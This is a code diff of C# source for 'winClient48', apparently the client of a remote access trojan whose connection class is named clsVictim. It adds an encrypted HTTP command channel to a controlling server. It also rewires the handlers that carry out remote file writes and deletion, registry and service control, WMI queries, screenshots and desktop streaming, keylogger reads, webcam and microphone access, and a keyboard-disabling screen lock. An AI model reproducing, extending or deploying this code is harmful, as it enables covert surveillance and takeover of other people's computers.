@@ -420,11 +420,6 @@ namespace winClient48
                     nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);
                     abDynamicRecvBuffer = CombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecv);
 
-                    if (nRecv == 0)
-                    {
-                        MessageBox.Show("0");
-                    }
-
                     if (nRecv <= 0)
                         break;
                     else if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
@@ -475,21 +470,91 @@ namespace winClient48
 
         void fnHttpRecv(clsVictim victim)
         {
-            try
+            try 
             {
-                if (victim == null)
-                    return;
-
-                Socket sktClnt = victim.socket;
+                Socket socket = victim.socket;
                 clsDSP dsp = null;
+                int recv_len = 0;
+                byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                byte[] dynamic_recvBuf = new byte[] { };
+
+                victim.fnHttpSend(1, 0, clsEZData.fnGenerateRandomStr());
+
+                do
+                {
+                    static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                    recv_len = victim.socket.Receive(static_recvBuf);
+                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
+
+                    if (recv_len <= 0)
+                        break;
+                    else if (dynamic_recvBuf.Length < clsDSP.HEADER_SIZE)
+                        continue;
+                    else
+                    {
+                        string szHttpResp = Encoding.UTF8.GetString(dynamic_recvBuf);
+                        string szBody = szHttpResp.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None).Last();
+
+                        dynamic_recvBuf = Convert.FromBase64String(szBody);
+
+                        dsp = new clsDSP(dynamic_recvBuf);
+                        dynamic_recvBuf = dsp.MoreData;
+
+                        var head_info = clsDSP.GetHeader(dynamic_recvBuf);
+
+                        if (dsp.Command == 0)
+                        {
+                            if (dsp.Param == 0) //DISCONNECT
+                            {
+                                Disconnect();
+                            }
+                            else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
+                            {
+                                Reconnect();
+                            }
+                        }
+                        else if (dsp.Command == 1) //KEY EXCHANGE
+                        {
+                            if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
+                            {
+                                string rsa_publicKey = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
+                                rsa_publicKey = clsCrypto.b64D2Str(rsa_publicKey);
+                                victim.key_pairs.public_key = rsa_publicKey;
+                                var aes = clsCrypto.AES_GenerateKeyAndIV();
+                                victim._AES.key = Convert.FromBase64String(aes.key);
+                                victim._AES.iv = Convert.FromBase64String(aes.iv);
+                                string payload = aes.key + "|" + aes.iv;
+                                byte[] enc_payload = clsCrypto.RSAEncrypt(payload, rsa_publicKey);
 
 
+                                victim.fnHttpSend(1, 1, Convert.ToBase64String(enc_payload));
+                            }
+                            else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
+                            {
+                                byte[] buffer = dsp.GetMsg().msg;
+                                string payload = Encoding.UTF8.GetString(buffer);
+                                buffer = Convert.FromBase64String(payload);
+                                payload = clsCrypto.AESDecrypt(buffer, victim._AES.key, victim._AES.iv);
+                                payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, victim.key_pairs.public_key));
+                                payload = clsCrypto.AESEncrypt(payload, victim._AES.key, victim._AES.iv);
+                                victim.fnHttpSend(1, 3, payload);
+                            }
+                            else if (dsp.Param == 4)
+                            {
+                                new Thread(() => SendInfo(victim)).Start();
+                            }
+                        }
+                    }
+                }
+                while (recv_len > 0);
             }
             catch (Exception ex)
             {
-
+                MessageBox.Show(ex.Message);
+                is_connected = false;
             }
         }
+
 
         /// <summary>
         /// Process function data from server.
@@ -775,7 +840,7 @@ namespace winClient48
                         string path = clsCrypto.b64D2Str(cmd[2]);
                         string text = clsCrypto.b64D2Str(cmd[3]);
 
-                        v.encSend(2, 0, "file|write|" + funcFile.WriteFile(path, text));
+                        v.SendCommand("file|write|" + funcFile.WriteFile(path, text));
                     }
                     else if (cmd[1] == "paste") //PASTE
                     {
@@ -785,7 +850,7 @@ namespace winClient48
                             string[] files = cmd[4].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                             string dir_dst = clsCrypto.b64D2Str(cmd[5]);
 
-                            v.encSend(2, 0, "file|paste|" + funcFile.PasteItems(folders, files, dir_dst, cmd[2] == "mv"));
+                            v.SendCommand("file|paste|" + funcFile.PasteItems(folders, files, dir_dst, cmd[2] == "mv"));
                         }
                     }
                     else if (cmd[1] == "del") //DELETE
@@ -794,7 +859,7 @@ namespace winClient48
                         string[] folders = cmd[3].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                         string[] files = cmd[4].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
 
-                        v.encSend(2, 0, "file|del|" + funcFile.DeleteItems(folders, files));
+                        v.SendCommand("file|del|" + funcFile.DeleteItems(folders, files));
                     }
                     else if (cmd[1] == "uf") //UPLOAD FILE
                     {
@@ -859,7 +924,7 @@ namespace winClient48
 
                         (List<string[]> dInfo, List<string[]> fInfo) = funcFile.Archive_Compress(folders, files, archiveName);
 
-                        v.encSend(2, 0, string.Join("|", new string[]
+                        v.SendCommand(string.Join("|", new string[]
                         {
                             "file",
                             "zip",
@@ -889,7 +954,7 @@ namespace winClient48
 
                         List<string[]> aInfo = funcFile.Archive_Extract(archives, dirName, method, delete);
 
-                        v.encSend(2, 0, string.Join("|", new string[]
+                        v.SendCommand(string.Join("|", new string[]
                         {
                             "file",
                             "unzip",
@@ -904,14 +969,14 @@ namespace winClient48
                     else if (cmd[1] == "img")
                     {
                         List<string> data = funcFile.ShowImage(v, cmd[2]);
-                        v.encSend(2, 0, $"file|img|" + string.Join(",", data.ToArray()));
+                        v.SendCommand($"file|img|" + string.Join(",", data.ToArray()));
                     }
                     else if (cmd[1] == "new")
                     {
                         if (cmd[2] == "folder")
                         {
-                            try { Directory.CreateDirectory(clsCrypto.b64D2Str(cmd[3])); v.encSend(2, 0, "file|new|folder|1|"); }
-                            catch (Exception ex) { v.encSend(2, 0, "file|new|folder|0|" + clsCrypto.b64E2Str(ex.Message)); }
+                            try { Directory.CreateDirectory(clsCrypto.b64D2Str(cmd[3])); v.SendCommand("file|new|folder|1|"); }
+                            catch (Exception ex) { v.SendCommand("file|new|folder|0|" + clsCrypto.b64E2Str(ex.Message)); }
                         }
                     }
                     else if (cmd[1] == "find")
@@ -977,7 +1042,7 @@ namespace winClient48
                     if (cmd[1] == "init")
                     {
                         string data = WMI_Query(clsCrypto.b64D2Str(cmd[2]));
-                        v.encSend(2, 0, "task|init|" + data);
+                        v.SendCommand("task|init|" + data);
                     }
                     else if (cmd[1] == "start")
                     {
@@ -1052,17 +1117,17 @@ namespace winClient48
                     if (cmd[1] == "init") //INITIALIZATION
                     {
                         string data = funcReg.GetRootKeys();
-                        v.encSend(2, 0, "reg|init|" + data);
+                        v.SendCommand("reg|init|" + data);
                     }
                     else if (cmd[1] == "item") //SCAN DIRECTORY
                     {
                         string path = clsCrypto.b64D2Str(cmd[3]);
-                        v.encSend(2, 0, $"reg|item|{Path.Combine(cmd[2], path)}|" + funcReg.GetItems(cmd[2], path));
+                        v.SendCommand($"reg|item|{Path.Combine(cmd[2], path)}|" + funcReg.GetItems(cmd[2], path));
                     }
                     else if (cmd[1] == "goto") //CHECK SPECIFIED PATH EXISTED
                     {
                         string path = clsCrypto.b64D2Str(cmd[3]);
-                        v.encSend(2, 0, $"reg|goto|{clsCrypto.b64E2Str(Path.Combine(cmd[2], path))}|" + (funcReg.Goto(cmd[2], path) ? "1" : "0"));
+                        v.SendCommand($"reg|goto|{clsCrypto.b64E2Str(Path.Combine(cmd[2], path))}|" + (funcReg.Goto(cmd[2], path) ? "1" : "0"));
                     }
                     else if (cmd[1] == "add")
                     {
@@ -1215,7 +1280,7 @@ namespace winClient48
 
                     if (cmd[1] == "init")
                     {
-                        v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
+                        v.SendCommand("conn|init|" + funcConn.GetConn());
                     }
                 }
 
@@ -1226,7 +1291,7 @@ namespace winClient48
                     if (cmd[1] == "init")
                     {
                         string data = WMI_Query(clsCrypto.b64D2Str(cmd[2]));
-                        v.encSend(2, 0, "serv|init|" + data);
+                        v.SendCommand("serv|init|" + data);
                     }
                     else if (cmd[1] == "control")
                     {
@@ -1235,11 +1300,11 @@ namespace winClient48
                         if (status == "restart")
                         {
                             funcServ.ServiceControl(names, "Stopped");
-                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, "Running"));
+                            v.SendCommand("serv|control|" + funcServ.ServiceControl(names, "Running"));
                         }
                         else
                         {
-                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, status));
+                            v.SendCommand("serv|control|" + funcServ.ServiceControl(names, status));
                         }
                     }
                 }
@@ -1303,7 +1368,7 @@ namespace winClient48
                         {
                             List<string[]> apps = funcSystem.ListApp();
                             string data = string.Join(",", apps.Select(x => string.Join(";", x.Select(y => clsCrypto.b64E2Str(y)))).ToArray());
-                            v.encSend(2, 0, "system|app|init|" + data);
+                            v.SendCommand("system|app|init|" + data);
                         }
                         else if (cmd[2] == "detail") //GET MORE INFORMATION OF SPECIFIED APPLCIATION.
                         {
@@ -1337,12 +1402,12 @@ namespace winClient48
                         {
                             List<string[]> devices = funcSystem.Device_ListDevices();
                             string data = string.Join(",", devices.Select(x => string.Join(";", x.Select(y => clsCrypto.b64E2Str(y)).ToArray())).ToArray());
-                            v.encSend(2, 0, "system|device|init|" + data);
+                            v.SendCommand("system|device|init|" + data);
                         }
                         else if (cmd[2] == "enable") //ENABLE, DISABLE
                         {
                             var x = funcSystem.DeviceEnable(cmd[3], bool.Parse(cmd[4]));
-                            v.encSend(2, 0, $"system|device|{cmd[2]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            v.SendCommand($"system|device|{cmd[2]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
                         }
                         else if (cmd[2] == "info")
                         {
@@ -1385,11 +1450,11 @@ namespace winClient48
                         if (cmd[2] == "init")
                         {
                             List<string[]> interfaces = funcSystem.If_ListInterface();
-                            v.encSend(2, 0, "system|if|init|" + string.Join(",", interfaces.Select(x => string.Join(";", x.Select(y => clsCrypto.b64E2Str(y)).ToArray())).ToArray()));
+                            v.SendCommand("system|if|init|" + string.Join(",", interfaces.Select(x => string.Join(";", x.Select(y => clsCrypto.b64E2Str(y)).ToArray())).ToArray()));
                         }
                         else if (cmd[2] == "enable") //ENABLE, DISABLE
                         {
-                            v.encSend(2, 0, $"system|if|{cmd[2]}|" + funcSystem.If_Enable(clsCrypto.b64D2Str(cmd[3]), bool.Parse(cmd[4])));
+                            v.SendCommand($"system|if|{cmd[2]}|" + funcSystem.If_Enable(clsCrypto.b64D2Str(cmd[3]), bool.Parse(cmd[4])));
                         }
                     }
                 }
@@ -1422,8 +1487,8 @@ namespace winClient48
                 #region WMI Shell
                 else if (cmd[0] == "wmi")
                 {
-                    try { v.encSend(2, 0, "wmi|output|" + WMI_Query(clsCrypto.b64D2Str(cmd[1]))); }
-                    catch (Exception ex) { v.encSend(2, 0, "wmi|error|" + clsCrypto.b64E2Str(ex.Message)); }
+                    try { v.SendCommand("wmi|output|" + WMI_Query(clsCrypto.b64D2Str(cmd[1]))); }
+                    catch (Exception ex) { v.SendCommand("wmi|error|" + clsCrypto.b64E2Str(ex.Message)); }
                 }
                 #endregion
                 #region Remote Desktop(Monitor)
@@ -1452,7 +1517,7 @@ namespace winClient48
                         }
                         else
                         {
-                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
+                            new Thread(() => v.SendCommand("desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                         }
                     }
                     else if (cmd[1] == "stop")
@@ -1474,7 +1539,7 @@ namespace winClient48
 
                     if (cmd[1] == "status")
                     {
-                        v.encSend(2, 0, $"mouse|status|" + funcMouse.Status());
+                        v.SendCommand($"mouse|status|" + funcMouse.Status());
                     }
                     else if (cmd[1] == "move")
                     {
@@ -1558,7 +1623,7 @@ namespace winClient48
                     }
                     else if (cmd[1] == "read") //READ KEY LOGGER FILE
                     {
-                        v.encSend(2, 0, $"keylogger|read|{clsCrypto.b64E2Str(keylogger.file_keylogger)}|" + clsCrypto.b64E2Str(keylogger.Read()));
+                        v.SendCommand($"keylogger|read|{clsCrypto.b64E2Str(keylogger.file_keylogger)}|" + clsCrypto.b64E2Str(keylogger.Read()));
                     }
                     else if (cmd[1] == "new")
                     {
@@ -1577,7 +1642,7 @@ namespace winClient48
                     if (cmd[1] == "init")
                     {
                         webcam = new Webcam();
-                        v.encSend(2, 0, "webcam|init|" + string.Join(",", webcam.GetDevices()));
+                        v.SendCommand("webcam|init|" + string.Join(",", webcam.GetDevices()));
                     }
                     else if (cmd[1] == "start" || cmd[1] == "snapshot")
                     {
@@ -1780,7 +1845,7 @@ namespace winClient48
                             keyboard.Disable();
                             funcFun.HideMouse();
 
-                            v.encSend(2, 0, "fun|screen|lock|1");
+                            v.SendCommand("fun|screen|lock|1");
                         }
                         else if (cmd[2] == "ulock")
                         {
@@ -2040,7 +2105,7 @@ namespace winClient48
 
                         v.SendCommand($"audio|init|{szPayload1}|{szPayload2}");
 
-                        //v.encSend(2, 0, "audio|init|" + funcMicAudio.Init());
+                        //v.SendCommand("audio|init|" + funcMicAudio.Init());
                     }
                     else if (cmd[1] == "vol") //VOLUME
                     {
@@ -2069,7 +2134,7 @@ namespace winClient48
                             funcMicAudio.DisableMute = false;
                         }
 
-                        v.encSend(2, 0, "audio|update|" + cmd[2]);
+                        v.SendCommand("audio|update|" + cmd[2]);
                     }
                     else if (cmd[1] == "speak")
                     {
@@ -2603,7 +2668,7 @@ namespace winClient48
             {
                 Bitmap bmp = fnScreenShot(v, device_name, width, height);
                 string b64_img = Global.BitmapToBase64(bmp);
-                v.encSend(2, 0, "desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+                v.SendCommand("desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                 Thread.Sleep(m_nDesktopDelay);
             }
             send_stopped = true;
